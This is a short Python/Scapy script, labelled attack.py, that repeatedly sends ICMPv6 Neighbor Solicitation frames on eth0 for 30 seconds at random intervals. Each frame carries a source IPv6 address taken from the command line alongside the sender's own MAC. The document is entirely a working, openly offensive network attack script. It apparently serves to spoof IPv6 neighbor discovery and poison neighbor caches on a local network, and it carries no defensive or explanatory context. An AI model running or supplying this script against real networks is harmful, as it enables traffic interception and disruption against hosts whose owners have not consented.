from scapy.all import *
from scapy.layers.inet6 import ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr
from scapy.layers.inet6 import IPv6
from scapy.layers.l2 import Ether
import sys
import time

def send_ns(target_ip, src_ip, interface):
    # Define the destination multicast address for Neighbor Solicitation
    target_multicast = in6_getnsma(target_ip)
    # Define the source MAC address
    src_mac = get_if_hwaddr(interface)
    # Define the destination MAC address
    dst_mac = in6_getnsmac(target_multicast)

    # Craft the Neighbor Solicitation message
    packet = Ether(dst=dst_mac, src=src_mac) / \
             IPv6(dst=target_multicast, src=src_ip) / \
             ICMPv6ND_NS(tgt=target_ip) / \
             ICMPv6NDOptSrcLLAddr(lladdr=src_mac)

    # Send the packet
    sendp(packet, iface=interface)
    print(f"Neighbor Solicitation sent for {target_ip} from {src_ip}")

target_ip = "2001:db8::0:0:0:0:1"  # Target IPv6 address
if len(sys.argv) != 2:
    print("Usage: python attack.py <src_ip>")
    sys.exit(1)

src_ip = sys.argv[1]  # Source IPv6 address
interface = "eth0"     # Network interface to send the packet
attack_duration = 30    # Duration of the attack in seconds

# Send Neighbor Solicitation packets for the specified duration
start_time = time.time()
while time.time() - start_time < attack_duration:
    send_ns(target_ip, src_ip, interface)
    # Random delay between packets
    delay = random.uniform(0.1, 1.0)  # Random delay between 0.1 and 1 second
    time.sleep(delay)
